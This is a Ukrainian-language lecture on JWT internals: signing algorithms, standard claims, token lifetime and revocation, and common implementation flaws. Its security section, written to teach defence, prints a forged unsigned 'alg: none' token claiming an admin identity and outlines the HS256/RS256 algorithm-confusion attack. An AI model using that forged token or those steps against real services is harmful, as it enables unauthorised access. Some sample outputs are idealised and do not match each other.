# Структура JSON Web Token (JWT)

## Короткий зміст

У цій лекції розглядається внутрішня будова та криптографічні засади JWT токенів:

- **Структура токена** — три частини: Header (метадані та алгоритм підпису), Payload (корисне навантаження з claims), Signature (криптографічний підпис для верифікації)
- **Формат та кодування** — Base64URL кодування кожної частини, формат `header.payload.signature`
- **Алгоритми підпису** — симетричні (HS256, HS384, HS512 з shared secret) vs асиметричні (RS256, RS384, RS512 з парою ключів public/private)
- **Стандартні claims** — registered claims (`iss` issuer, `sub` subject, `aud` audience, `exp` expiration, `iat` issued at, `nbf` not before, `jti` JWT ID), public та private claims
- **Час життя токена (TTL)** — короткий TTL для безпеки (15 хв для access token), проблема відкликання токенів до закінчення TTL
- **Інструменти** — jwt.io для декодування та верифікації, практичні приклади аналізу реальних токенів

Вивчається, чому JWT є stateless (сервер не зберігає токени), як працює верифікація підпису без звернення до БД, та чому JWT не можна відкликати без додаткових механізмів (blacklist або refresh token rotation).

---

::card-group

::card{title="🎯 Мета лекції" icon="i-lucide-target"}

- Розібрати внутрішню структуру JWT токенів на рівні байтів та криптографічних операцій.
- Опанувати різницю між симетричним (HMAC) та асиметричним (RSA, ECDSA) підписом токенів.
- Навчитися правильно обирати claims для різних сценаріїв автентифікації та авторизації.
- Зрозуміти обмеження JWT як stateless механізму та необхідність додаткових стратегій для відкликання токенів.

::

::card{title="🔑 Ключові терміни" icon="i-lucide-key"}

- **Claim (Твердження):** пара «ключ-значення» у payload токена, що описує характеристику або дозвіл (наприклад, `"sub": "user123"`).
- **Base64URL:** модифікація Base64 кодування, безпечна для використання у URL (замінює `+` на `-`, `/` на `_`, прибирає `=`).
- **Signature (Підпис):** криптографічний хеш header та payload, підписаний секретним ключем для гарантії цілісності.
- **TTL (Time To Live):** час життя токена від моменту видачі до автоматичного застарівання.

::

::

---

## Анатомія JWT токена: три частини

JWT токен є самодостатньою структурою даних, що складається з трьох сегментів, розділених крапками. Кожен сегмент несе специфічну роль у забезпеченні автентифікації та цілісності даних.

### Візуальна декомпозиція токена

Розглянемо реальний приклад JWT токена та його розбір на складові:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1NTBlODQwMC1lMjliLTQxZDQtYTcxNi00NDY2NTU0NDAwMDAiLCJlbWFpbCI6Iml2YW5AZXhhbXBsZS5jb20iLCJyb2xlcyI6WyJ1c2VyIl0sImlhdCI6MTY5MzU2NDgwMCwiZXhwIjoxNjkzNTY1NzAwfQ.4Hb3LM-TqHX-2JcGKz9yP3qF8vZ5nR7wQ1xS6mE9kLo
```

**Структура:**

```
[Header].[Payload].[Signature]
```

::mermaid

```mermaid
graph LR
    A[JWT Token] --> B[Header<br/>eyJhbGc...XVCJ9]
    A --> C[Payload<br/>eyJzdWI...NzAwfQ]
    A --> D[Signature<br/>4Hb3LM...E9kLo]
    
    B --> B1["#123;'alg': 'HS256'<br/>'typ': 'JWT'#125;"]
    C --> C1["#123;'sub': 'user-id'<br/>'email': 'ivan@...'<br/>'roles': ['user']<br/>'iat': 1693564800<br/>'exp': 1693565700#125;"]
    D --> D1["HMACSHA256(<br/>base64(header) + '.' +<br/>base64(payload),<br/>secret<br/>)"]
    
    style A fill:#3b82f6,stroke:#1d4ed8,color:#ffffff
    style B fill:#8b5cf6,stroke:#6d28d9,color:#ffffff
    style C fill:#10b981,stroke:#047857,color:#ffffff
    style D fill:#f59e0b,stroke:#b45309,color:#ffffff
```

::

### Частина 1: Header (Заголовок)

Header містить метадані про токен — тип структури та алгоритм криптографічного підпису. Це мінімальний JSON-об'єкт з двома обов'язковими полями:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Поля заголовка:**

| Поле | Опис | Приклади значень |
|------|------|------------------|
| `alg` | Алгоритм підпису токена | `HS256` (HMAC SHA-256), `RS256` (RSA SHA-256), `ES256` (ECDSA SHA-256), `none` (небезпечно!) |
| `typ` | Тип токена, завжди `JWT` | `JWT` |
| `kid` (опціонально) | Key ID — ідентифікатор ключа підпису у випадку ротації ключів | `"key-2024-01"`, `"prod-rsa-key"` |

Після визначення JSON-структури заголовок кодується у **Base64URL**:

```typescript
const header = { alg: 'HS256', typ: 'JWT' };
const encodedHeader = base64UrlEncode(JSON.stringify(header));
// Результат: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
```

::note
**Чому Base64URL, а не звичайний Base64?** Стандартне Base64 кодування генерує символи `+`, `/` та `=`, які мають спеціальне значення у URL-адресах і HTTP-заголовках. Base64URL замінює їх на `-`, `_` та прибирає padding символи `=`, що робить токен безпечним для передачі у query parameters та заголовках без додаткового URL-encoding.
::

### Частина 2: Payload (Корисне навантаження)

Payload містить **claims** — твердження про користувача та метадані токена. Це JSON-об'єкт довільної структури, що зберігає дані, необхідні для автентифікації та авторизації:

```json
{
  "sub": "550e8400-e29b-41d4-a716-446655440000",
  "email": "ivan@example.com",
  "roles": ["user"],
  "iat": 1693564800,
  "exp": 1693565700
}
```

Payload також кодується у Base64URL:

```typescript
const payload = {
  sub: '550e8400-e29b-41d4-a716-446655440000',
  email: 'ivan@example.com',
  roles: ['user'],
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + 900, // +15 хвилин
};
const encodedPayload = base64UrlEncode(JSON.stringify(payload));
// Результат: "eyJzdWI...NzAwfQ"
```

::warning
**JWT токени не є зашифрованими — вони лише підписані.** Будь-хто може декодувати Base64URL та прочитати вміст payload без знання секретного ключа. Тому **ніколи не зберігайте у JWT конфіденційні дані** — паролі, номери кредитних карток, приватні ключі або sensitive персональні дані. Payload призначений лише для **неконфіденційних метаданих** автентифікації.
::

### Частина 3: Signature (Підпис)

Signature є криптографічним доказом того, що токен не був змінений після створення. Він обчислюється шляхом хешування закодованих header та payload за допомогою секретного ключа:

```typescript
const signature = HMACSHA256(
  encodedHeader + '.' + encodedPayload,
  SECRET_KEY
);
const encodedSignature = base64UrlEncode(signature);
// Результат: "4Hb3LM-TqHX-2JcGKz9yP3qF8vZ5nR7wQ1xS6mE9kLo"
```

**Процес верифікації токена на сервері:**

1. Сервер отримує токен від клієнта у заголовку `Authorization: Bearer <token>`.
2. Розділяє токен на три частини за крапками.
3. Декодує header та payload з Base64URL.
4. **Обчислює підпис заново** з тим самим секретним ключем.
5. Порівнює обчислений підпис з підписом, що міститься у токені.
6. Якщо підписи співпадають — токен дійсний і не був змінений. Якщо не співпадають — токен підроблений або секретний ключ не той.

::tip
**Переваги криптографічного підпису:** сервер може перевірити токен **без звернення до бази даних або Redis**. Йому достатньо мати лише секретний ключ у пам'яті процесу. Це дозволяє обробляти десятки тисяч запитів на секунду без навантаження на сховище даних, що є ключовою перевагою stateless автентифікації.
::

---

## Алгоритми підпису: симетричні vs асиметричні

Вибір алгоритму підпису визначає, які ключі використовуються для створення та перевірки токенів, а також розподіл відповідальності між компонентами системи.

### Симетричні алгоритми (HMAC)

**HMAC (Hash-based Message Authentication Code)** використовує **один спільний секретний ключ** (*shared secret*) для підпису та верифікації токенів. Той самий ключ, який використовується для створення підпису, потрібен для його перевірки.

**Доступні алгоритми:**

- **HS256** (HMAC SHA-256) — найпопулярніший, рекомендований для більшості застосунків.
- **HS384** (HMAC SHA-384) — більша довжина хешу, рідко використовується.
- **HS512** (HMAC SHA-512) — максимальна криптографічна стійкість, але більший розмір токена.

**Приклад генерації та верифікації:**

```typescript
import { sign, verify } from 'jsonwebtoken';

// Генерація токена
const SECRET_KEY = process.env.JWT_SECRET; // 256-бітний випадковий ключ
const token = sign(
  {
    sub: user.id,
    email: user.email,
    roles: user.roles,
  },
  SECRET_KEY,
  {
    algorithm: 'HS256',
    expiresIn: '15m',
  }
);

// Верифікація токена
try {
  const payload = verify(token, SECRET_KEY, {
    algorithms: ['HS256'], // Явно вказуємо допустимі алгоритми
  });
  console.log('Token valid, user ID:', payload.sub);
} catch (error) {
  console.error('Token invalid:', error.message);
}
```

**Переваги HMAC:**
- ✅ Простота реалізації — один ключ для всього.
- ✅ Висока швидкість — хешування працює швидше за асиметричне шифрування.
- ✅ Менший розмір токена — підпис HMAC коротший за RSA/ECDSA.

**Недоліки HMAC:**
- ❌ **Спільний секрет:** той самий ключ використовується для підпису та верифікації. Якщо сторонній сервіс потребує перевіряти токени, йому доведеться надати цей ключ, що створює ризик компрометації.
- ❌ **Складність ротації ключів:** при зміні ключа всі видані токени стають недійсними миттєво.

**Коли використовувати HMAC:**
- Монолітні застосунки, де один сервер видає та перевіряє токени.
- Внутрішні мікросервіси, де всі компоненти довіряють один одному.
- Малі та середні проєкти без вимог до делегованої верифікації.



### Асиметричні алгоритми (RSA, ECDSA)

**Асиметричне шифрування** використовує **пару ключів** — приватний ключ (*private key*) для підпису токенів та публічний ключ (*public key*) для верифікації. Приватний ключ зберігається на сервері авторизації у секреті, тоді як публічний ключ може бути розповсюджений усім сервісам, що потребують перевіряти токени.

**Доступні алгоритми:**

- **RS256** (RSA SHA-256) — стандарт для OAuth 2.0 та OpenID Connect.
- **RS384** (RSA SHA-384), **RS512** (RSA SHA-512) — більша криптографічна стійкість.
- **ES256** (ECDSA SHA-256) — сучасний алгоритм на еліптичних кривих, коротші ключі за аналогічної безпеки.
- **ES384** (ECDSA SHA-384), **ES512** (ECDSA SHA-512).

**Приклад генерації пари ключів RSA:**

```bash
# Генерація приватного ключа (2048 біт)
openssl genrsa -out private.pem 2048

# Витягування публічного ключа з приватного
openssl rsa -in private.pem -pubout -out public.pem
```

**Використання у коді:**

```typescript
import { sign, verify } from 'jsonwebtoken';
import { readFileSync } from 'fs';

// Завантаження ключів з файлів
const privateKey = readFileSync('./private.pem', 'utf8');
const publicKey = readFileSync('./public.pem', 'utf8');

// Генерація токена (виконується лише на Authorization Server)
const token = sign(
  {
    sub: user.id,
    email: user.email,
    roles: user.roles,
  },
  privateKey,
  {
    algorithm: 'RS256',
    expiresIn: '15m',
  }
);

// Верифікація токена (може виконуватися будь-яким сервісом з публічним ключем)
try {
  const payload = verify(token, publicKey, {
    algorithms: ['RS256'],
  });
  console.log('Token valid, user ID:', payload.sub);
} catch (error) {
  console.error('Token invalid:', error.message);
}
```

**Переваги асиметричного підпису:**
- ✅ **Делегована верифікація:** сторонні сервіси можуть перевіряти токени за допомогою публічного ключа без доступу до приватного.
- ✅ **Безпека ротації:** при зміні приватного ключа достатньо розповсюдити новий публічний ключ через JWKS endpoint (детальніше у наступних лекціях).
- ✅ **Стандарт OAuth 2.0:** всі великі провайдери (Google, Microsoft, Auth0) використовують RS256.

**Недоліки асиметричного підпису:**
- ❌ **Повільніше за HMAC:** RSA операції потребують більше CPU ресурсів (різниця у 10–50 разів).
- ❌ **Більший розмір токена:** підпис RSA займає 256–512 байтів проти 32–64 байтів HMAC.
- ❌ **Складніша інфраструктура:** потрібне управління парою ключів, їхнє зберігання у секреті та розповсюдження публічних ключів.

**Коли використовувати асиметричний підпис:**
- Мікросервісна архітектура, де десятки сервісів мають перевіряти токени без доступу до приватного ключа.
- OAuth 2.0 та OpenID Connect провайдери.
- Системи з делегованою авторизацією (токени видає один сервіс, перевіряють — інші).

::tip
**Оптимальний вибір алгоритму:**

- **Монолітний застосунок:** HS256 (простота та швидкість).
- **Мікросервіси з довіреним внутрішнім контуром:** HS256 через shared secret у Kubernetes Secrets.
- **Публічні API з сторонніми клієнтами:** RS256 (стандарт індустрії).
- **Сучасні high-performance системи:** ES256 (баланс між швидкістю та безпекою).
::

---

## Стандартні Claims: семантика JWT

JWT специфікація (RFC 7519) визначає набір **зареєстрованих claims** (*registered claims*) зі стандартизованим семантичним значенням. Ці claims дозволяють системам обмінюватися токенами з передбачуваною структурою.

### Registered Claims (Зареєстровані твердження)

Усі зареєстровані claims є опціональними, але їхнє використання дозволяє реалізувати складні сценарії безпеки.

| Claim | Повна назва | Тип | Опис |
|-------|-------------|-----|------|
| `iss` | Issuer | string | Ідентифікатор сервера, що видав токен. Наприклад, `"https://auth.example.com"` або `"my-app-v1"`. |
| `sub` | Subject | string | Ідентифікатор суб'єкта токена — зазвичай user ID або service account ID. Має бути унікальним у межах `iss`. |
| `aud` | Audience | string або string[] | Призначення токена — який сервіс або застосунок має приймати цей токен. Наприклад, `"api.example.com"`. |
| `exp` | Expiration Time | number | Unix timestamp у секундах, коли токен застаріває. Після цього часу токен вважається недійсним. |
| `nbf` | Not Before | number | Unix timestamp у секундах, до якого токен ще не є дійсним. Використовується для запланованої активації. |
| `iat` | Issued At | number | Unix timestamp у секундах, коли токен був видан. Корисний для логування та аудиту. |
| `jti` | JWT ID | string | Унікальний ідентифікатор токена. Використовується для запобігання replay attacks або реалізації blacklist. |

**Приклад токена з усіма registered claims:**

```typescript
const payload = {
  iss: 'https://auth.myapp.com',          // Хто видав
  sub: '550e8400-e29b-41d4-a716-446655440000', // Для кого
  aud: ['api.myapp.com', 'admin.myapp.com'],   // Де приймається
  exp: Math.floor(Date.now() / 1000) + 900,    // Застаріває через 15 хвилин
  nbf: Math.floor(Date.now() / 1000),          // Дійсний відразу
  iat: Math.floor(Date.now() / 1000),          // Час видачі
  jti: crypto.randomUUID(),                    // Унікальний ID токена
};

const token = sign(payload, SECRET_KEY, { algorithm: 'HS256' });
```

### Детальний розбір критичних claims

**Claim `exp` (Expiration Time):**

Це найважливіший claim для безпеки. Він визначає **автоматичне застарівання токена** без необхідності серверного відкликання. Сервер при верифікації порівнює поточний час з `exp`:

```typescript
const payload = verify(token, SECRET_KEY);
const now = Math.floor(Date.now() / 1000);

if (payload.exp < now) {
  throw new UnauthorizedException('Token has expired');
}
```

Бібліотека `jsonwebtoken` виконує цю перевірку автоматично при виклику `verify()`.

**Рекомендовані значення `exp` для різних типів токенів:**

- **Access Token:** 5–15 хвилин (баланс між безпекою та UX).
- **Refresh Token:** 7–30 днів (зберігається у HttpOnly cookie або захищеному сховищі).
- **ID Token (OpenID Connect):** 1 година (використовується лише для отримання інформації про користувача).
- **Email Verification Token:** 24–48 годин (одноразовий, деактивується після використання).

**Claim `aud` (Audience):**

Визначає, які сервіси мають право приймати цей токен. Це захищає від атак, де токен, видан для одного API, використовується для доступу до іншого:

```typescript
// Генерація токена для конкретного API
const token = sign(
  {
    sub: user.id,
    aud: 'api.myapp.com', // Цей токен діє лише для API
  },
  SECRET_KEY
);

// Перевірка audience при верифікації
try {
  const payload = verify(token, SECRET_KEY, {
    audience: 'api.myapp.com', // Відхилить токени з іншим aud
  });
} catch (error) {
  throw new UnauthorizedException('Token not intended for this service');
}
```

**Claim `jti` (JWT ID):**

Унікальний ідентифікатор токена, що дозволяє реалізувати **blacklist відкликаних токенів**:

```typescript
// Генерація токена з унікальним ID
const jti = crypto.randomUUID();
const token = sign(
  {
    sub: user.id,
    jti: jti,
    exp: Math.floor(Date.now() / 1000) + 900,
  },
  SECRET_KEY
);

// При виході користувача — додаємо jti до blacklist у Redis
await redis.setex(`blacklist:${jti}`, 900, 'revoked'); // TTL = exp - now

// При верифікації — перевірка blacklist
const payload = verify(token, SECRET_KEY);
const isBlacklisted = await redis.exists(`blacklist:${payload.jti}`);

if (isBlacklisted) {
  throw new UnauthorizedException('Token has been revoked');
}
```

::warning
**Проблема blacklist:** перевірка blacklist вимагає звернення до Redis при кожному запиті, що **нівелює основну перевагу JWT** — stateless верифікацію. Blacklist має сенс лише для критичних сценаріїв (вихід користувача, зміна паролю, блокування облікового запису). Для звичайних операцій покладайтеся на короткий TTL access токенів.
::

### Public та Private Claims

**Public Claims** — це claims, визначені у публічних реєстрах (IANA JWT Claims Registry) або через URI, що запобігають колізіям назв між різними системами:

```typescript
{
  "sub": "user123",
  "https://myapp.com/claims/department": "engineering",
  "https://myapp.com/claims/clearance_level": 3
}
```

**Private Claims** — це custom claims, визначені розробниками застосунку для внутрішнього використання. Немає гарантій унікальності назв:

```typescript
{
  "sub": "user123",
  "email": "ivan@example.com",
  "roles": ["user", "moderator"],
  "subscription_tier": "premium",
  "language": "uk"
}
```

::tip
**Best practice для custom claims:** використовуйте короткі назви для зменшення розміру токена (`email`, `roles`), але уникайте колізій зі стандартними claims. Якщо застосунок інтегрується зі сторонніми системами, використовуйте namespace через URI (`https://myapp.com/claims/...`).
::



---

## Час життя токена та проблема відкликання

Одна з фундаментальних характеристик JWT — їхня **stateless природа**. Сервер не зберігає видані токени у базі даних або Redis, що забезпечує горизонтальне масштабування та високу продуктивність. Проте ця перевага стає недоліком у сценаріях, де необхідно миттєво відкликати токен.

### Проблема: неможливість відкликання до exp

Розглянемо небезпечний сценарій:

1. Користувач входить у систему о 10:00 та отримує access token з `exp = 10:15` (15 хвилин життя).
2. О 10:05 адміністратор блокує обліковий запис користувача у базі даних.
3. Користувач продовжує надсилати запити з дійсним токеном до 10:15 — **сервер приймає запити**, оскільки підпис токена дійсний, а `exp` ще не настав.

**Чому сервер не знає про блокування?**

JWT токени є **самодостатніми** — всі дані містяться всередині токена, а сервер перевіряє лише криптографічний підпис. Він **не звертається до бази даних** для завантаження поточного статусу користувача. Зміни у базі даних (блокування, зміна ролей, вихід) **не впливають** на вже видані токени до закінчення їхнього TTL.

### Стратегії мітигації проблеми

::card-group

::card{title="⏱️ Короткий TTL Access Token" icon="i-lucide-clock"}

Найпростіше рішення — встановити дуже короткий термін життя access токена (5–15 хвилин). Це обмежує **вікно вразливості** до 15 хвилин у найгіршому випадку. Для зручності користувачів використовується механізм **refresh tokens** (детально у наступній лекції) — довгоживучий токен, що дозволяє автоматично отримувати нові access токени.

**Конфігурація:**
```typescript
// Access Token — короткий TTL
const accessToken = sign(payload, SECRET_KEY, { expiresIn: '15m' });

// Refresh Token — довгий TTL, зберігається у HttpOnly cookie
const refreshToken = sign({ sub: user.id }, REFRESH_SECRET, { expiresIn: '7d' });
```

**Переваги:** простота реалізації, мінімальне навантаження на інфраструктуру.

**Недоліки:** 15-хвилинне вікно вразливості залишається.

::

::card{title="🚫 Blacklist відкликаних токенів" icon="i-lucide-ban"}

Зберігання списку відкликаних токенів у Redis за їхнім `jti` (JWT ID). При верифікації сервер перевіряє, чи не міститься `jti` у blacklist:

```typescript
// Відкликання токена при виході користувача
await redis.setex(
  `blacklist:${payload.jti}`,
  payload.exp - Math.floor(Date.now() / 1000), // TTL = залишок часу до exp
  'revoked'
);

// Перевірка при верифікації
const payload = verify(token, SECRET_KEY);
const isRevoked = await redis.exists(`blacklist:${payload.jti}`);

if (isRevoked) {
  throw new UnauthorizedException('Token has been revoked');
}
```

**Переваги:** миттєве відкликання токенів.

**Недоліки:** втрата stateless природи JWT — кожен запит вимагає звернення до Redis. При великій кількості активних користувачів це створює значне навантаження на сховище.

::

::card{title="🔄 Refresh Token Rotation" icon="i-lucide-refresh-cw"}

Замість відкликання access токенів система відкликає refresh токени, збережені у базі даних. При спробі оновити access token сервер перевіряє, чи не відкликаний refresh token:

```typescript
// Зберігання refresh token у БД при логіні
await db.refreshTokens.create({
  tokenHash: hashSync(refreshToken, 10), // Зберігаємо хеш, не сам токен
  userId: user.id,
  expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  isRevoked: false,
});

// Відкликання всіх refresh токенів при блокуванні користувача
await db.refreshTokens.updateMany(
  { userId: user.id },
  { isRevoked: true }
);
```

**Переваги:** баланс між stateless верифікацією access токенів (без звернення до БД) та можливістю відкликання через refresh токени.

**Недоліки:** складніша реалізація, вимагає додаткового API ендпоінту `/auth/refresh`.

::

::card{title="📡 Real-time Push Invalidation" icon="i-lucide-radio"}

Для критичних систем (онлайн-банкінг, корпоративні системи) використовується механізм push-нотифікацій про відкликання токенів через WebSocket або Server-Sent Events:

```typescript
// При блокуванні користувача — відправка події всім екземплярам сервера
await pubsub.publish('token.revoked', {
  userId: user.id,
  revokedAt: Date.now(),
});

// Кожен сервер підписується на події та кешує список відкликаних користувачів
pubsub.subscribe('token.revoked', (message) => {
  revokedUsersCache.set(message.userId, message.revokedAt, 900); // TTL 15 хвилин
});

// При верифікації — швидка перевірка in-memory кешу
const revokedAt = revokedUsersCache.get(payload.sub);
if (revokedAt && payload.iat < revokedAt / 1000) {
  throw new UnauthorizedException('User has been blocked');
}
```

**Переваги:** миттєве відкликання з мінімальним навантаженням (перевірка in-memory кешу).

**Недоліки:** найскладніша архітектура, вимагає Redis Pub/Sub або інший message broker.

::

::

**Рекомендація:**

Для **більшості застосунків** оптимальним є **комбінація короткого TTL access токенів (15 хвилин) та refresh token rotation**. Це забезпечує баланс між безпекою, продуктивністю та складністю реалізації.

---

## Практична робота з JWT: декодування та аналіз

Для глибокого розуміння структури JWT корисно вручну декодувати токени та аналізувати їхній вміст. Розглянемо інструменти та практичні приклади.

### Інструмент jwt.io

**JWT.io** — це офіційний онлайн-дебаггер від Auth0, що дозволяє:

- Декодувати та відображати вміст header та payload.
- Верифікувати підпис токена (для HS256 потрібен секретний ключ, для RS256 — публічний).
- Згенерувати нові токени з custom claims.

**Приклад використання:**

1. Відкрийте [jwt.io](https://jwt.io) у браузері.
2. Вставте JWT токен у поле **Encoded**.
3. Сайт автоматично розбере токен на три частини та відобразить декодований JSON.

::terminal-preview{title="Приклад декодування JWT"}

<div class="line"><span class="opacity-40">$</span> <strong class="font-bold">echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwiZW1haWwiOiJpdmFuQGV4YW1wbGUuY29tIiwicm9sZXMiOlsidXNlciJdLCJpYXQiOjE2OTM1NjQ4MDAsImV4cCI6MTY5MzU2NTcwMH0.4Hb3LM-TqHX-2JcGKz9yP3qF8vZ5nR7wQ1xS6mE9kLo" | base64 -d</strong></div>
<div class="line"></div>
<div class="line"><span class="text-blue-400 font-bold">Decoded Header:</span></div>
<div class="line">{"alg":"HS256","typ":"JWT"}</div>
<div class="line"></div>
<div class="line"><span class="text-blue-400 font-bold">Decoded Payload:</span></div>
<div class="line">{"sub":"user123","email":"ivan@example.com","roles":["user"],"iat":1693564800,"exp":1693565700}</div>
<div class="line"></div>
<div class="line"><span class="text-green-400 font-bold">✓</span> Signature: 4Hb3LM-TqHX-2JcGKz9yP3qF8vZ5nR7wQ1xS6mE9kLo</div>

::

### Ручне декодування у Node.js

```typescript
function decodeJWT(token: string) {
  const [encodedHeader, encodedPayload, signature] = token.split('.');

  // Декодування Base64URL у JSON
  const header = JSON.parse(Buffer.from(encodedHeader, 'base64url').toString());
  const payload = JSON.parse(Buffer.from(encodedPayload, 'base64url').toString());

  return { header, payload, signature };
}

const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIn0...';
const decoded = decodeJWT(token);

console.log('Header:', decoded.header);
// { alg: 'HS256', typ: 'JWT' }

console.log('Payload:', decoded.payload);
// { sub: 'user123', email: 'ivan@example.com', ... }

console.log('Signature (Base64URL):', decoded.signature);
```

### Аналіз реального токена від Google OAuth

Розглянемо структуру `id_token`, виданого Google при OAuth 2.0 автентифікації:

```json
{
  "iss": "https://accounts.google.com",
  "azp": "1234567890-abcdefg.apps.googleusercontent.com",
  "aud": "1234567890-abcdefg.apps.googleusercontent.com",
  "sub": "1234567890",
  "email": "ivan@gmail.com",
  "email_verified": true,
  "at_hash": "HK6E_P6Dh8Y93mRNtsDB1Q",
  "name": "Іван Петренко",
  "picture": "https://lh3.googleusercontent.com/a/default-user",
  "given_name": "Іван",
  "family_name": "Петренко",
  "locale": "uk",
  "iat": 1693564800,
  "exp": 1693568400
}
```

**Пояснення Google-специфічних claims:**

- **`azp` (Authorized Party):** client ID застосунку, що запросив токен.
- **`email_verified`:** чи підтвердив користувач свою електронну пошту у Google.
- **`at_hash` (Access Token Hash):** хеш access токена для перевірки зв'язку між `id_token` та `access_token`.
- **`picture`:** URL аватара користувача з Google профілю.
- **`locale`:** мовні налаштування користувача.

::note
Google використовує **RS256** (асиметричний підпис) для всіх токенів. Публічні ключі доступні через **JWKS (JSON Web Key Set)** endpoint: `https://www.googleapis.com/oauth2/v3/certs`. Ваш застосунок завантажує ці ключі та верифікує підпис токенів без знання приватного ключа Google.
::



---

## Безпека JWT: типові вразливості та захист

Неправильна реалізація JWT призводить до серйозних вразливостей безпеки. Розглянемо найпоширеніші атаки та методи захисту.

### Атака "none" алгоритм

Деякі бібліотеки JWT підтримують алгоритм `"alg": "none"`, що означає **відсутність підпису**. Зловмисник може змінити header на `{"alg": "none", "typ": "JWT"}`, видалити signature та надіслати такий токен на сервер:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGVzIjpbImFkbWluIl19.
```

Якщо сервер не перевіряє список допустимих алгоритмів, він прийме цей токен як дійсний!

**Захист:**

```typescript
// ❌ НЕБЕЗПЕЧНО — дозволяє будь-який алгоритм
const payload = verify(token, SECRET_KEY);

// ✅ БЕЗПЕЧНО — явно вказуємо допустимі алгоритми
const payload = verify(token, SECRET_KEY, {
  algorithms: ['HS256'], // Жорсткий whitelist
});
```

Бібліотека `jsonwebtoken` за замовчуванням **відхиляє** алгоритм `none`, але явна перевірка є best practice.

### Атака підміни алгоритму (HS256 → RS256)

У системах, що використовують RS256 (асиметричний підпис), публічний ключ зазвичай доступний для верифікації. Зловмисник може:

1. Завантажити публічний ключ сервера.
2. Створити токен з `"alg": "HS256"` (симетричний підпис).
3. Підписати токен **публічним ключем** як секретом HMAC.
4. Надіслати токен на сервер.

Якщо сервер не перевіряє алгоритм, він спробує верифікувати токен як HS256, використовуючи публічний ключ як секрет — і підпис співпаде!

**Захист:**

```typescript
// ❌ НЕБЕЗПЕЧНО — автоматично визначає алгоритм з header
const payload = verify(token, publicKey);

// ✅ БЕЗПЕЧНО — явно вказуємо очікуваний алгоритм
const payload = verify(token, publicKey, {
  algorithms: ['RS256'], // Лише асиметричний підпис
});
```

::caution
**Золоте правило безпеки JWT:** ніколи не довіряйте полю `alg` з header токена. Завжди явно вказуйте список допустимих алгоритмів у параметрах верифікації. Це запобігає атакам підміни алгоритму та використанню `none`.
::

### Зберігання секретних ключів

**Секретний ключ для HMAC** або **приватний ключ для RSA** — це найцінніші дані вашої системи автентифікації. Їхня компрометація дозволяє зловмиснику підробляти токени довільних користувачів.

**Best practices зберігання:**

::card-group

::card{title="🔐 Змінні оточення" icon="i-lucide-shield"}

Ніколи не зберігайте ключі у коді або конфігураційних файлах, що коммітяться у Git. Використовуйте змінні оточення:

```typescript
const SECRET_KEY = process.env.JWT_SECRET;

if (!SECRET_KEY) {
  throw new Error('JWT_SECRET environment variable is not set');
}
```

У продакшені змінні оточення завантажуються з **secrets management систем** (AWS Secrets Manager, Azure Key Vault, HashiCorp Vault).

::

::card{title="🔄 Ротація ключів" icon="i-lucide-rotate-cw"}

Регулярна зміна ключів (кожні 3–6 місяців) зменшує наслідки можливої компрометації. При ротації старий ключ зберігається для верифікації токенів, що ще не застаріли:

```typescript
const CURRENT_KEY = process.env.JWT_SECRET_CURRENT;
const PREVIOUS_KEY = process.env.JWT_SECRET_PREVIOUS;

// Генерація з поточним ключем
const token = sign(payload, CURRENT_KEY);

// Верифікація з fallback на попередній ключ
try {
  return verify(token, CURRENT_KEY);
} catch (error) {
  return verify(token, PREVIOUS_KEY); // Токени зі старим ключем ще дійсні
}
```

::

::card{title="📏 Довжина ключа" icon="i-lucide-ruler"}

**Мінімальна довжина ключа для HS256:** 256 біт (32 байти). Короткі ключі вразливі до brute-force атак. Генеруйте ключі криптографічно стійким генератором:

```bash
# Генерація 256-бітного ключа у hex форматі
openssl rand -hex 32
```

**RSA ключі:** мінімум 2048 біт (рекомендовано 4096 біт для high-security систем).

::

::

---

## Інтерактивні запитання для самоперевірки

::accordion

::accordion-item{label="❓ Чи можна змінити payload токена без знання секретного ключа?" icon="i-lucide-help-circle"}

Технічно можна декодувати Base64URL, змінити JSON payload та закодувати його назад. Проте після зміни payload **підпис перестане співпадати**, оскільки він був обчислений для оригінального вмісту. При верифікації сервер обчислить підпис заново і виявить невідповідність:

```typescript
// Зловмисник змінює payload
const fakePayload = { sub: 'admin', roles: ['admin'] };
const fakeToken = encodedHeader + '.' + base64UrlEncode(JSON.stringify(fakePayload)) + '.' + originalSignature;

// Сервер при верифікації
const computedSignature = HMACSHA256(encodedHeader + '.' + encodedFakePayload, SECRET_KEY);
// computedSignature ≠ originalSignature → токен недійсний
```

Для підробки токена потрібен **секретний ключ** (для HMAC) або **приватний ключ** (для RSA), без яких неможливо створити дійсний підпис.

::

::accordion-item{label="❓ Чому Base64URL, а не звичайний Base64?" icon="i-lucide-help-circle"}

Стандартне Base64 кодування генерує символи, що мають спеціальне значення у URL та HTTP-заголовках:

- `+` інтерпретується як пробіл у URL query parameters.
- `/` є роздільником шляхів у URL.
- `=` використовується для padding і має спеціальне значення у URL-encoding.

**Base64URL** замінює ці символи на безпечні альтернативи:
- `+` → `-` (дефіс)
- `/` → `_` (підкреслення)
- Видаляє `=` (padding)

Це дозволяє передавати JWT токени у URL (наприклад, `/reset-password?token=...`) та HTTP-заголовках без додаткового URL-encoding.

::

::accordion-item{label="❓ Як довго має жити access token для оптимального балансу безпека/UX?" icon="i-lucide-help-circle"}

Немає універсальної відповіді — це залежить від критичності застосунку та толерантності користувачів до повторних входів:

**Онлайн-банкінг, фінансові системи:** 5–10 хвилин (максимальна безпека).

**Корпоративні системи (CRM, ERP):** 15–30 хвилин (баланс між безпекою та зручністю офісних співробітників).

**Соціальні мережі, e-commerce:** 1–2 години (пріоритет UX над безпекою).

**Публічні API для мобільних застосунків:** 15 хвилин access token + 30 днів refresh token (автоматичне оновлення без втручання користувача).

**Золотий стандарт:** 15 хвилин access token з механізмом refresh tokens. Це забезпечує прийнятне вікно вразливості та seamless UX через автоматичне оновлення токенів на фоні.

::

